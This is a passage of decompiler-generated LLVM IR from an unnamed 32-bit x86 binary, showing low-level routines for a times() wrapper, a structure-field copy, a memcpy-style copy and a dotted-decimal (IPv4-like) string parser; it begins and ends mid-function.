  %v1_8051f26 = icmp eq i32 %v0_8051f26, 0
  %v1_8051f31 = icmp eq i1 %v1_8051f26, false
  br i1 %v1_8051f31, label %dec_label_pc_8051f44, label %dec_label_pc_8051f33

dec_label_pc_8051f33:                             ; preds = %dec_label_pc_8051f21
  %v1_8051f38 = call i32 @function_80520ff(i32 0)
  %v2_8051f40 = icmp slt i32 %v1_8051f38, 0
  br i1 %v2_8051f40, label %dec_label_pc_8051f66, label %dec_label_pc_8051f33.dec_label_pc_8051f44_crit_edge

dec_label_pc_8051f33.dec_label_pc_8051f44_crit_edge: ; preds = %dec_label_pc_8051f33
  %v0_8051f46.pre = load i32, i32* @global_var_8053a78.70, align 8
  br label %dec_label_pc_8051f44

dec_label_pc_8051f44:                             ; preds = %dec_label_pc_8051f33.dec_label_pc_8051f44_crit_edge, %dec_label_pc_8051f21
  %v0_8051f54 = phi i32 [ %v0_8051f46.pre, %dec_label_pc_8051f33.dec_label_pc_8051f44_crit_edge ], [ %v0_8051f26, %dec_label_pc_8051f21 ]
  %v1_8051f44 = icmp eq i32 %arg1, 0
  %v1_8051f4b = icmp eq i1 %v1_8051f44, false
  store i32 %v0_8051f54, i32* @ebx, align 4
  br i1 %v1_8051f4b, label %dec_label_pc_8051f51, label %dec_label_pc_8051f69

dec_label_pc_8051f51:                             ; preds = %dec_label_pc_8051f44
  %v2_8051f56 = add i32 %v0_8051f54, %arg1
  %v1_8051f5a = call i32 @function_80520ff(i32 %v2_8051f56)
  %v2_8051f62 = icmp slt i32 %v1_8051f5a, 0
  %v1_8051f64 = icmp eq i1 %v2_8051f62, false
  br i1 %v1_8051f64, label %dec_label_pc_8051f51.dec_label_pc_8051f69_crit_edge, label %dec_label_pc_8051f66

dec_label_pc_8051f51.dec_label_pc_8051f69_crit_edge: ; preds = %dec_label_pc_8051f51
  %v0_8051f69.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051f69

dec_label_pc_8051f66:                             ; preds = %dec_label_pc_8051f51, %dec_label_pc_8051f33
  br label %dec_label_pc_8051f69

dec_label_pc_8051f69:                             ; preds = %dec_label_pc_8051f44, %dec_label_pc_8051f51.dec_label_pc_8051f69_crit_edge, %dec_label_pc_8051f66
  %v0_8051f69 = phi i32 [ %v0_8051f69.pre, %dec_label_pc_8051f51.dec_label_pc_8051f69_crit_edge ], [ -1, %dec_label_pc_8051f66 ], [ %v0_8051f54, %dec_label_pc_8051f44 ]
  %v2_8051f6b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051f6b, i32* @edx, align 4
  store i32 %v0_8051f22, i32* @ebx, align 4
  ret i32 %v0_8051f69

; uselistorder directives
  uselistorder i32 %v0_8051f54, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_80520ff, { 1, 0 }
  uselistorder label %dec_label_pc_8051f69, { 2, 1, 0 }
}

define i32 @function_8051f6f(%tms* %arg1) local_unnamed_addr {
dec_label_pc_8051f6f:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f6f = load i32, i32* @edi, align 4
  store i32 %v0_8051f6f, i32* %stack_var_-4, align 4
  %v4_8051f73 = ptrtoint %tms* %arg1 to i32
  store i32 %v4_8051f73, i32* %edi.global-to-local, align 4
  %v0_8051f77 = load i32, i32* @ebx, align 4
  %v3_8051f7f = call i32 @times(%tms* %arg1)
  store i32 %v3_8051f7f, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8051f7f, -4095
  br i1 %tmp9, label %dec_label_pc_8051f97, label %dec_label_pc_8051f8b

dec_label_pc_8051f8b:                             ; preds = %dec_label_pc_8051f6f
  %v1_8051f8b = call i32 @function_804fe1b(i32 %v0_8051f77)
  %v0_8051f90 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051f90 = sub i32 0, %v0_8051f90
  %v2_8051f92 = inttoptr i32 %v1_8051f8b to i32*
  store i32 %v1_8051f90, i32* %v2_8051f92, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8051f9b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051f97

dec_label_pc_8051f97:                             ; preds = %dec_label_pc_8051f6f, %dec_label_pc_8051f8b
  %v2_8051f9b = phi i32 [ %v0_8051f6f, %dec_label_pc_8051f6f ], [ %v2_8051f9b.pre, %dec_label_pc_8051f8b ]
  %v0_8051f97 = phi i32 [ %v3_8051f7f, %dec_label_pc_8051f6f ], [ -1, %dec_label_pc_8051f8b ]
  store i32 %v2_8051f9b, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051f97

; uselistorder directives
  uselistorder i32 %v3_8051f7f, { 1, 0, 2 }
  uselistorder i32* @edi, { 10, 11, 12, 13, 14, 15, 140, 2, 141, 148, 36, 46, 47, 48, 49, 50, 37, 38, 39, 40, 41, 42, 43, 44, 45, 3, 4, 5, 6, 7, 8, 9, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 26, 27, 28, 29, 30, 146, 147, 31, 32, 33, 34, 35, 51, 52, 53, 54, 55, 56, 104, 57, 58, 59, 105, 106, 142, 143, 144, 145, 97, 98, 99, 139, 108, 109, 110, 111, 112, 113, 114, 115, 63, 64, 65, 83, 84, 85, 67, 68, 69, 70, 71, 91, 92, 93, 94, 95, 96, 80, 81, 82, 86, 87, 88, 89, 90, 116, 117, 100, 118, 107, 119, 120, 121, 60, 61, 62, 101, 72, 66, 73, 74, 75, 76, 77, 78, 79, 102, 103, 122, 123, 124, 125, 126, 127, 1, 128, 129, 130, 131, 132, 133, 134, 135, 136, 138, 137 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051f97, { 1, 0 }
}

define i32 @function_8051f9d(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051f9d:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051f9e = load i32, i32* @ebx, align 4
  store i32 %v0_8051f9e, i32* %stack_var_-8, align 4
  %v4_8051fa2 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051fa2, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_8051faf = inttoptr i32 %arg2 to i8*
  %v4_8051faf = call i32 @function_804fe6c(i8* %v3_8051faf, i32 0, i32 88)
  store i32 %v4_8051faf, i32* %eax.global-to-local, align 4
  %v2_8051fb4 = load i16, i16* %arg1, align 2
  %v3_8051fb4 = zext i16 %v2_8051fb4 to i32
  store i32 %v3_8051fb4, i32* %eax.global-to-local, align 4
  %v0_8051fb7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051fb7 = add i32 %v0_8051fb7, 4
  %v2_8051fb7 = inttoptr i32 %v1_8051fb7 to i32*
  store i32 0, i32* %v2_8051fb7, align 4
  %v0_8051fbe = load i32, i32* %eax.global-to-local, align 4
  %v1_8051fbe = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051fbe = inttoptr i32 %v1_8051fbe to i32*
  store i32 %v0_8051fbe, i32* %v2_8051fbe, align 4
  %v0_8051fc0 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051fc0 = add i32 %v0_8051fc0, 4
  %v2_8051fc0 = inttoptr i32 %v1_8051fc0 to i32*
  %v3_8051fc0 = load i32, i32* %v2_8051fc0, align 4
  store i32 %v3_8051fc0, i32* %eax.global-to-local, align 4
  %v1_8051fc3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051fc3 = add i32 %v1_8051fc3, 12
  %v3_8051fc3 = inttoptr i32 %v2_8051fc3 to i32*
  store i32 %v3_8051fc0, i32* %v3_8051fc3, align 4
  %v0_8051fc6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051fc6 = add i32 %v0_8051fc6, 8
  %v2_8051fc6 = inttoptr i32 %v1_8051fc6 to i16*
  %v3_8051fc6 = load i16, i16* %v2_8051fc6, align 2
  %v4_8051fc6 = zext i16 %v3_8051fc6 to i32
  store i32 %v4_8051fc6, i32* %eax.global-to-local, align 4
  %v1_8051fca = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051fca = add i32 %v1_8051fca, 16
  %v3_8051fca = inttoptr i32 %v2_8051fca to i32*
  store i32 %v4_8051fc6, i32* %v3_8051fca, align 4
  %v0_8051fcd = load i32, i32* %esi.global-to-local, align 4
  %v1_8051fcd = add i32 %v0_8051fcd, 10
  %v2_8051fcd = inttoptr i32 %v1_8051fcd to i16*
  %v3_8051fcd = load i16, i16* %v2_8051fcd, align 2
  %v4_8051fcd = zext i16 %v3_8051fcd to i32
  store i32 %v4_8051fcd, i32* %eax.global-to-local, align 4
  %v1_8051fd1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051fd1 = add i32 %v1_8051fd1, 20
  %v3_8051fd1 = inttoptr i32 %v2_8051fd1 to i32*
  store i32 %v4_8051fcd, i32* %v3_8051fd1, align 4
  %v0_8051fd4 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051fd4 = add i32 %v0_8051fd4, 12
  %v2_8051fd4 = inttoptr i32 %v1_8051fd4 to i16*
  %v3_8051fd4 = load i16, i16* %v2_8051fd4, align 2
  %v4_8051fd4 = zext i16 %v3_8051fd4 to i32
  store i32 %v4_8051fd4, i32* %eax.global-to-local, align 4
  %v1_8051fd8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051fd8 = add i32 %v1_8051fd8, 24
  %v3_8051fd8 = inttoptr i32 %v2_8051fd8 to i32*
  store i32 %v4_8051fd4, i32* %v3_8051fd8, align 4
  %v0_8051fdb = load i32, i32* %esi.global-to-local, align 4
  %v1_8051fdb = add i32 %v0_8051fdb, 14
  %v2_8051fdb = inttoptr i32 %v1_8051fdb to i16*
  %v3_8051fdb = load i16, i16* %v2_8051fdb, align 2
  %v4_8051fdb = zext i16 %v3_8051fdb to i32
  store i32 %v4_8051fdb, i32* %eax.global-to-local, align 4
  %v1_8051fdf = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051fdf = add i32 %v1_8051fdf, 28
  %v3_8051fdf = inttoptr i32 %v2_8051fdf to i32*
  store i32 %v4_8051fdb, i32* %v3_8051fdf, align 4
  %v0_8051fe2 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051fe2 = add i32 %v0_8051fe2, 16
  %v2_8051fe2 = inttoptr i32 %v1_8051fe2 to i16*
  %v3_8051fe2 = load i16, i16* %v2_8051fe2, align 2
  %v4_8051fe2 = zext i16 %v3_8051fe2 to i32
  store i32 %v4_8051fe2, i32* %eax.global-to-local, align 4
  %v0_8051fe6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051fe6 = add i32 %v0_8051fe6, 36
  %v2_8051fe6 = inttoptr i32 %v1_8051fe6 to i32*
  store i32 0, i32* %v2_8051fe6, align 4
  %v0_8051fed = load i32, i32* %eax.global-to-local, align 4
  %v1_8051fed = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051fed = add i32 %v1_8051fed, 32
  %v3_8051fed = inttoptr i32 %v2_8051fed to i32*
  store i32 %v0_8051fed, i32* %v3_8051fed, align 4
  %v0_8051ff0 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051ff0 = add i32 %v0_8051ff0, 20
  %v2_8051ff0 = inttoptr i32 %v1_8051ff0 to i32*
  %v3_8051ff0 = load i32, i32* %v2_8051ff0, align 4
  store i32 %v3_8051ff0, i32* %eax.global-to-local, align 4
  %v1_8051ff3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051ff3 = add i32 %v1_8051ff3, 44
  %v3_8051ff3 = inttoptr i32 %v2_8051ff3 to i32*
  store i32 %v3_8051ff0, i32* %v3_8051ff3, align 4
  %v0_8051ff6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051ff6 = add i32 %v0_8051ff6, 24
  %v2_8051ff6 = inttoptr i32 %v1_8051ff6 to i32*
  %v3_8051ff6 = load i32, i32* %v2_8051ff6, align 4
  store i32 %v3_8051ff6, i32* %eax.global-to-local, align 4
  %v1_8051ff9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051ff9 = add i32 %v1_8051ff9, 48
  %v3_8051ff9 = inttoptr i32 %v2_8051ff9 to i32*
  store i32 %v3_8051ff6, i32* %v3_8051ff9, align 4
  %v0_8051ffc = load i32, i32* %esi.global-to-local, align 4
  %v1_8051ffc = add i32 %v0_8051ffc, 28
  %v2_8051ffc = inttoptr i32 %v1_8051ffc to i32*
  %v3_8051ffc = load i32, i32* %v2_8051ffc, align 4
  store i32 %v3_8051ffc, i32* %eax.global-to-local, align 4
  %v1_8051fff = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051fff = add i32 %v1_8051fff, 52
  %v3_8051fff = inttoptr i32 %v2_8051fff to i32*
  store i32 %v3_8051ffc, i32* %v3_8051fff, align 4
  %v0_8052002 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052002 = add i32 %v0_8052002, 32
  %v2_8052002 = inttoptr i32 %v1_8052002 to i32*
  %v3_8052002 = load i32, i32* %v2_8052002, align 4
  store i32 %v3_8052002, i32* %eax.global-to-local, align 4
  %v1_8052005 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052005 = add i32 %v1_8052005, 56
  %v3_8052005 = inttoptr i32 %v2_8052005 to i32*
  store i32 %v3_8052002, i32* %v3_8052005, align 4
  %v0_8052008 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052008 = add i32 %v0_8052008, 40
  %v2_8052008 = inttoptr i32 %v1_8052008 to i32*
  %v3_8052008 = load i32, i32* %v2_8052008, align 4
  store i32 %v3_8052008, i32* %eax.global-to-local, align 4
  %v1_805200b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805200b = add i32 %v1_805200b, 64
  %v3_805200b = inttoptr i32 %v2_805200b to i32*
  store i32 %v3_8052008, i32* %v3_805200b, align 4
  %v0_805200e = load i32, i32* %esi.global-to-local, align 4
  %v1_805200e = add i32 %v0_805200e, 48
  %v2_805200e = inttoptr i32 %v1_805200e to i32*
  %v3_805200e = load i32, i32* %v2_805200e, align 4
  store i32 %v3_805200e, i32* %eax.global-to-local, align 4
  %v1_8052011 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052011 = add i32 %v1_8052011, 72
  %v3_8052011 = inttoptr i32 %v2_8052011 to i32*
  store i32 %v3_805200e, i32* %v3_8052011, align 4
  %v2_8052017 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052017, i32* @ebx, align 4
  ret i32 %v3_805200e

; uselistorder directives
  uselistorder i32 72, { 1, 0, 2 }
  uselistorder i32 64, { 2, 1, 0 }
  uselistorder i32 40, { 5, 4, 1, 3, 2, 0, 6 }
  uselistorder i32 56, { 2, 1, 0 }
  uselistorder i32 52, { 1, 0, 2, 3 }
  uselistorder i32 48, { 4, 5, 3, 1, 2, 0 }
  uselistorder i32 32, { 22, 23, 29, 15, 19, 20, 21, 24, 1, 0, 2, 3, 18, 4, 5, 6, 7, 8, 26, 25, 10, 9, 12, 11, 13, 14, 17, 16, 27, 28 }
  uselistorder i32 36, { 4, 3, 0, 2, 1 }
  uselistorder i32 14, { 3, 0, 2, 1 }
  uselistorder i32 24, { 17, 18, 13, 14, 15, 19, 16, 20, 21, 1, 2, 10, 34, 39, 7, 5, 11, 24, 31, 0, 3, 32, 8, 4, 29, 40, 35, 9, 22, 23, 36, 12, 25, 6, 26, 27, 28, 30, 33, 37, 38, 41, 42, 43, 44, 46, 47, 45 }
  uselistorder i32 20, { 14, 15, 3, 10, 11, 12, 16, 13, 17, 18, 19, 1, 2, 9, 6, 4, 20, 0, 7, 8, 5, 21, 22, 23 }
  uselistorder i32 16, { 38, 39, 31, 32, 33, 34, 35, 36, 14, 27, 54, 3, 28, 29, 30, 0, 4, 40, 41, 6, 5, 42, 1, 7, 37, 43, 15, 17, 26, 11, 12, 23, 44, 8, 48, 20, 18, 45, 24, 46, 9, 21, 10, 22, 13, 19, 47, 49, 25, 50, 2, 51, 53, 16, 52 }
  uselistorder i32 8, { 39, 28, 29, 30, 31, 32, 33, 34, 35, 10, 105, 11, 106, 12, 18, 81, 82, 83, 84, 85, 86, 87, 3, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 4, 20, 21, 22, 23, 24, 25, 26, 27, 40, 41, 42, 43, 44, 45, 14, 5, 15, 6, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 13, 63, 64, 7, 65, 66, 67, 68, 8, 69, 36, 37, 38, 70, 104, 92, 93, 94, 16, 98, 91, 1, 2, 95, 88, 89, 90, 17, 96, 97, 19, 99, 100, 101, 102, 9, 103, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_804fe6c, { 1, 4, 3, 2, 0 }
}

define i32 @function_805201a(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805201a:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805201b = load i32, i32* @esi, align 4
  store i32 %v0_805201b, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_805201c = sdiv i32 %sext, 16777216
  store i32 %v4_805201c, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8052026 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052026, i32* %edi.global-to-local, align 4
  %v2_805202a = udiv i32 %v4_805201c, 4
  %v3_805202d = inttoptr i32 %arg2 to i8*
  %v4_805202d = bitcast i16* %arg1 to i8*
  %v5_805202d = call i8* @_memcpy(i8* %v4_805202d, i8* %v3_805202d, i32 %v2_805202a)
  %v0_805202f = load i32, i32* %eax.global-to-local, align 4
  %v2_805202f = and i32 %v0_805202f, 2
  %v3_805202f = icmp eq i32 %v2_805202f, 0
  br i1 %v3_805202f, label %dec_label_pc_8052035, label %dec_label_pc_8052033

dec_label_pc_8052033:                             ; preds = %dec_label_pc_805201a
  %v0_8052033 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052033 = inttoptr i32 %v0_8052033 to i16*
  %v2_8052033 = load i16, i16* %v1_8052033, align 2
  %v3_8052033 = load i32, i32* %edi.global-to-local, align 4
  %v4_8052033 = inttoptr i32 %v3_8052033 to i16*
  store i16 %v2_8052033, i16* %v4_8052033, align 2
  %v5_8052033 = load i32, i32* %edi.global-to-local, align 4
  %v6_8052033 = load i32, i32* %esi.global-to-local, align 4
  %v7_8052033 = load i1, i1* @df, align 1
  %v8_8052033 = select i1 %v7_8052033, i32 -2, i32 2
  %v9_8052033 = add i32 %v8_8052033, %v5_8052033
  %v10_8052033 = add i32 %v8_8052033, %v6_8052033
  store i32 %v9_8052033, i32* %edi.global-to-local, align 4
  store i32 %v10_8052033, i32* %esi.global-to-local, align 4
  %v0_8052035.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052035

dec_label_pc_8052035:                             ; preds = %dec_label_pc_805201a, %dec_label_pc_8052033
  %v0_8052035 = phi i32 [ %v0_805202f, %dec_label_pc_805201a ], [ %v0_8052035.pre, %dec_label_pc_8052033 ]
  %v2_8052035 = urem i32 %v0_8052035, 2
  %v3_8052035 = icmp eq i32 %v2_8052035, 0
  br i1 %v3_8052035, label %dec_label_pc_805203a, label %dec_label_pc_8052039

dec_label_pc_8052039:                             ; preds = %dec_label_pc_8052035
  %v0_8052039 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052039 = inttoptr i32 %v0_8052039 to i8*
  %v2_8052039 = load i8, i8* %v1_8052039, align 1
  %v3_8052039 = load i32, i32* %edi.global-to-local, align 4
  %v4_8052039 = inttoptr i32 %v3_8052039 to i8*
  store i8 %v2_8052039, i8* %v4_8052039, align 1
  %v5_8052039 = load i32, i32* %edi.global-to-local, align 4
  %v6_8052039 = load i32, i32* %esi.global-to-local, align 4
  %v7_8052039 = load i1, i1* @df, align 1
  %v8_8052039 = select i1 %v7_8052039, i32 -1, i32 1
  %v9_8052039 = add i32 %v8_8052039, %v5_8052039
  %v10_8052039 = add i32 %v8_8052039, %v6_8052039
  store i32 %v9_8052039, i32* %edi.global-to-local, align 4
  store i32 %v10_8052039, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805203a

dec_label_pc_805203a:                             ; preds = %dec_label_pc_8052035, %dec_label_pc_8052039
  store i32 %v4_8052026, i32* %eax.global-to-local, align 4
  %v2_805203e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805203e, i32* @esi, align 4
  ret i32 %v4_8052026

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 -2, { 12, 11, 9, 10, 4, 2, 0, 5, 1, 6, 3, 7, 8 }
  uselistorder i1* @df, { 3, 4, 1, 0, 2 }
  uselistorder i32 4, { 3, 39, 40, 31, 32, 33, 34, 149, 150, 153, 154, 0, 158, 159, 160, 151, 10, 17, 155, 157, 70, 79, 80, 81, 82, 83, 4, 71, 72, 73, 74, 75, 76, 77, 78, 68, 69, 20, 12, 21, 22, 23, 24, 25, 26, 27, 5, 29, 28, 41, 6, 42, 11, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 8, 63, 64, 66, 65, 7, 156, 152, 30, 35, 36, 37, 38, 67, 115, 116, 15, 93, 94, 122, 123, 16, 95, 125, 126, 127, 128, 129, 130, 87, 88, 89, 90, 91, 92, 108, 109, 110, 96, 97, 98, 117, 118, 119, 1, 120, 121, 105, 106, 107, 111, 112, 2, 113, 114, 131, 132, 84, 85, 86, 99, 100, 101, 102, 103, 104, 124, 18, 133, 134, 135, 136, 137, 140, 141, 142, 138, 139, 13, 148, 9, 143, 14, 144, 145, 146, 147, 161, 19 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 7, 6, 8, 9 }
  uselistorder i32* @esi, { 112, 113, 13, 14, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 3, 39, 40, 114, 115, 12, 116, 117, 118, 122, 125, 126, 127, 119, 120, 121, 62, 71, 4, 72, 73, 66, 67, 68, 69, 70, 63, 64, 65, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 46, 47, 48, 49, 50, 51, 52, 0, 53, 54, 55, 56, 5, 57, 11, 58, 59, 60, 61, 28, 100, 101, 41, 6, 42, 43, 44, 45, 74, 123, 124, 102, 103, 75, 78, 8, 92, 93, 77, 84, 10, 79, 80, 9, 88, 89, 90, 91, 83, 85, 86, 87, 7, 94, 76, 1, 95, 81, 82, 2, 96, 97, 98, 99, 104, 105, 106, 107, 108, 109, 110, 111, 128 }
  uselistorder label %dec_label_pc_805203a, { 1, 0 }
  uselistorder label %dec_label_pc_8052035, { 1, 0 }
}

define i32 @function_8052041(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052041:
  %v1_805204c = icmp eq i8* %arg1, null
  br i1 %v1_805204c, label %dec_label_pc_80520cd, label %dec_label_pc_8052050

dec_label_pc_8052050:                             ; preds = %dec_label_pc_8052041
  %v4_8052048 = ptrtoint i8* %arg1 to i32
  %v0_805205e.pre = load i32, i32* bitcast (i32** @global_var_80539a8.71 to i32*), align 8
  br label %dec_label_pc_805205b

dec_label_pc_805205b:                             ; preds = %dec_label_pc_8052050, %dec_label_pc_80520a4
  %v0_80520a4 = phi i32 [ 0, %dec_label_pc_8052050 ], [ %v2_80520aa, %dec_label_pc_80520a4 ]
  %v2_80520a7 = phi i32 [ 1, %dec_label_pc_8052050 ], [ %v3_80520a7, %dec_label_pc_80520a4 ]
  %v0_805205b = phi i32 [ %v4_8052048, %dec_label_pc_8052050 ], [ %v0_805205b3, %dec_label_pc_80520a4 ]
  %v1_805205b = inttoptr i32 %v0_805205b to i8*
  %v2_805205b = load i8, i8* %v1_805205b, align 1
  %v3_805205b = sext i8 %v2_805205b to i32
  %v2_8052064 = mul nsw i32 %v3_805205b, 2
  %v3_8052064 = add i32 %v2_8052064, %v0_805205e.pre
  %v4_8052064 = inttoptr i32 %v3_8052064 to i8*
  %v5_8052064 = load i8, i8* %v4_8052064, align 1
  %v6_8052064 = and i8 %v5_8052064, 8
  %v7_8052064 = icmp eq i8 %v6_8052064, 0
  br i1 %v7_8052064, label %dec_label_pc_80520cd, label %dec_label_pc_805206b

dec_label_pc_805206b:                             ; preds = %dec_label_pc_805205b
  %v4_805207f.pre = load i32, i32* @edx, align 4
  %v2_805207f34 = load i8, i8* %v1_805205b, align 1
  %v3_805207f35 = zext i8 %v2_805207f34 to i32
  %v5_805207f36 = and i32 %v4_805207f.pre, -256
  %v6_805207f37 = or i32 %v3_805207f35, %v5_805207f36
  store i32 %v6_805207f37, i32* @edx, align 4
  %v2_805208138 = sext i8 %v2_805207f34 to i32
  %v2_805208439 = mul nsw i32 %v2_805208138, 2
  %v3_805208440 = add i32 %v2_805208439, %v0_805205e.pre
  %v4_805208441 = inttoptr i32 %v3_805208440 to i16*
  %v5_805208442 = load i16, i16* %v4_805208441, align 2
  %v2_805208944 = and i16 %v5_805208442, 8
  %v3_805208945 = icmp eq i16 %v2_805208944, 0
  %v1_805208b46 = icmp eq i1 %v3_805208945, false
  br i1 %v1_805208b46, label %dec_label_pc_805206f, label %dec_label_pc_805208d

dec_label_pc_805206f:                             ; preds = %dec_label_pc_805206b, %dec_label_pc_805207e
  %v2_805208150 = phi i32 [ %v2_8052081, %dec_label_pc_805207e ], [ %v2_805208138, %dec_label_pc_805206b ]
  %v6_805207f49 = phi i32 [ %v6_805207f, %dec_label_pc_805207e ], [ %v6_805207f37, %dec_label_pc_805206b ]
  %v0_805207e48 = phi i32 [ %v1_805207e, %dec_label_pc_805207e ], [ %v0_805205b, %dec_label_pc_805206b ]
  %v1_805206f47 = phi i32 [ %v3_8052072, %dec_label_pc_805207e ], [ 0, %dec_label_pc_805206b ]
  %v3_805206f = mul i32 %v1_805206f47, 10
  %v2_8052072 = add i32 %v3_805206f, -48
  %v3_8052072 = add i32 %v2_8052072, %v2_805208150
  %v1_8052076 = add i32 %v3_8052072, -255
  %v6_8052076 = sub i32 254, %v3_8052072
  %v7_8052076 = and i32 %v6_8052076, %v3_8052072
  %v8_8052076 = icmp slt i32 %v7_8052076, 0
  %v9_8052076 = icmp eq i32 %v1_8052076, 0
  %v10_8052076 = icmp slt i32 %v1_8052076, 0
  %v3_805207c = icmp eq i1 %v10_8052076, %v8_8052076
  %v4_805207c = icmp eq i1 %v9_8052076, false
  %v5_805207c = and i1 %v4_805207c, %v3_805207c
  br i1 %v5_805207c, label %dec_label_pc_80520cd, label %dec_label_pc_805207e

dec_label_pc_805207e:                             ; preds = %dec_label_pc_805206f
  %v1_805207e = add i32 %v0_805207e48, 1
  %v1_805207f = inttoptr i32 %v1_805207e to i8*
  %v2_805207f = load i8, i8* %v1_805207f, align 1
  %v3_805207f = zext i8 %v2_805207f to i32
  %v5_805207f = and i32 %v6_805207f49, -256
  %v6_805207f = or i32 %v3_805207f, %v5_805207f
  store i32 %v6_805207f, i32* @edx, align 4
  %v2_8052081 = sext i8 %v2_805207f to i32
  %v2_8052084 = mul nsw i32 %v2_8052081, 2
  %v3_8052084 = add i32 %v2_8052084, %v0_805205e.pre
  %v4_8052084 = inttoptr i32 %v3_8052084 to i16*
  %v5_8052084 = load i16, i16* %v4_8052084, align 2
  %v2_8052089 = and i16 %v5_8052084, 8
  %v3_8052089 = icmp eq i16 %v2_8052089, 0
  %v1_805208b = icmp eq i1 %v3_8052089, false
  br i1 %v1_805208b, label %dec_label_pc_805206f, label %dec_label_pc_805208d

dec_label_pc_805208d:                             ; preds = %dec_label_pc_805207e, %dec_label_pc_805206b
  %v1_805206f.lcssa = phi i32 [ 0, %dec_label_pc_805206b ], [ %v3_8052072, %dec_label_pc_805207e ]
  %v0_805207e.lcssa = phi i32 [ %v0_805205b, %dec_label_pc_805206b ], [ %v1_805207e, %dec_label_pc_805207e ]
  %v2_805207f.lcssa = phi i8 [ %v2_805207f34, %dec_label_pc_805206b ], [ %v2_805207f, %dec_label_pc_805207e ]
  %v6_8052084.lcssa.in = phi i16 [ %v5_805208442, %dec_label_pc_805206b ], [ %v5_8052084, %dec_label_pc_805207e ]
  %v8_805208d = sub nsw i32 2, %v2_80520a7
  %v9_805208d = and i32 %v8_805208d, %v2_80520a7
  %v10_805208d = icmp slt i32 %v9_805208d, 0
  %v11_805208d = icmp eq i32 %v2_80520a7, 3
  %v12_805208d = icmp slt i32 %v2_80520a7, 3
  %v3_8052091 = icmp eq i1 %v12_805208d, %v10_805208d
  %v4_8052091 = icmp eq i1 %v11_805208d, false
  %v5_8052091 = and i1 %v4_8052091, %v3_8052091
  br i1 %v5_8052091, label %dec_label_pc_805209b, label %dec_label_pc_8052093

dec_label_pc_8052093:                             ; preds = %dec_label_pc_805208d
  %v10_8052093 = icmp eq i8 %v2_805207f.lcssa, 46
  %v1_8052096 = icmp eq i1 %v10_8052093, false
  br i1 %v1_8052096, label %dec_label_pc_80520cd, label %dec_label_pc_8052098

dec_label_pc_8052098:                             ; preds = %dec_label_pc_8052093
  br label %dec_label_pc_80520a4

dec_label_pc_805209b:                             ; preds = %dec_label_pc_805208d
  %v4_805209c = icmp ne i8 %v2_805207f.lcssa, 0
  %v2_80520a0 = and i16 %v6_8052084.lcssa.in, 32
  %v3_80520a0 = icmp eq i16 %v2_80520a0, 0
  %or.cond = and i1 %v4_805209c, %v3_80520a0
